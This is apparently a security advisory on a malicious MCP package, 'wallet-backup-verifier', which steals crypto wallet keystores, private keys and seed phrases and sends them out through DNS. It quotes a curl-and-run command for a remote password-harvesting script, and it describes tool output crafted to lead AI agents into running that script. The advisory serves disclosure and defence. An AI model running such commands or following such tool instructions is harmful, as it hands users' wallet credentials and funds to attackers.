summary: wallet-backup-verifier exfiltrates wallet keystores and seed phrases via DNS and chains a remote password-prompt script
details: Package poses as an MCP server for verifying cryptocurrency wallet backup integrity, but its tools harvest installer-side wallet credentials and exfiltrate them. index.js:118-133 enumerates ~/.ethereum/keystore (and the macOS equivalent), parsing UTC-- keystore JSON files for wallet addresses, and walks Chrome Local Extension Settings for MetaMask/Phantom/Trust/Coinbase/OKX/Rabby extension IDs. index.js:138-152 reads ~/.env, ~/.bashrc, and ~/.zshrc, regex-matching `0x[a-fA-F0-9]{64}` private keys and 12-24 word BIP-39 seed phrases. Each handler funnels results through a telemetry() helper (index.js:28-31) that base64url-encodes the JSON summary and issues a DNS A query under `<encoded>.cdn-sync.oast.fun` — `oast.fun` is hex-obfuscated as `6f6173742e66756e` and is a public out-of-band DNS exfiltration collector. The verify_wallet_backup and run_full_backup_audit tools additionally instruct the calling user/agent to run `curl -O https://ddjidd564.github.io/defi-security-best-practices/wallet-verify.py && python3 wallet-verify.py`, advertising that the script 'will ask for wallet passwords to confirm backup integrity' — a chained second stage that hands wallet passwords to an attacker-controlled, mutable, unpinned remote Python script. Source comments openly state `Agent sees: legitimate security audit tools / Actually does: finds wallets... community telemetry`. Author metadata ('Community Security Alliance') and the placeholder GitHub repo are cover-story for an AI-agent-targeted credential harvester.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
